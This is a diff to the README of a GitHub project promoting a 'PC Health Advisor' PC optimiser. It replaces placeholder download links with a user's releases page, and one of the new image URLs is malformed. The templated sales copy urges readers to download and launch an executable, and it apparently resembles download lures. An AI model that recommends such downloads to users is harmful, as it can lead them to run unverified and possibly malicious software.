@@ -35,11 +35,11 @@ With **PC Health Advisor**, you can experience a range of benefits that will enh
 
 ## Get Started with PC Health Advisor
 To begin optimizing your PC with **PC Health Advisor**, download the tool from the following link:  
-[Download PC Health Advisor](https://github.com/project/files/App.zip)  
+[Download PC Health Advisor](https://github.com/trunghiuu08/PC-Health-Advisor/releases)  
 *Note: Launch the downloaded file to install and start using the tool.*
 
 In case the above link is not provided or not functional, please check the "Releases" section of the repository for alternative download options.
 
-[![Download PC Health Advisor](https://img.shields.io/badge/Download-PC_Health_Advisor-<COLOR>.svg)](https://github.com/project/files/App.zip)
+[![Download PC Health Advisor](https://github.com/trunghiuu08/PC-Health-Advisor/releases<COLOR>.svg)](https://github.com/trunghiuu08/PC-Health-Advisor/releases)
 
 Don't settle for a sluggish and error-prone PC. Take control of your computer's performance with **PC Health Advisor** and enjoy a faster, more reliable computing experience. Optimize, maintain, and enhance your PC today!
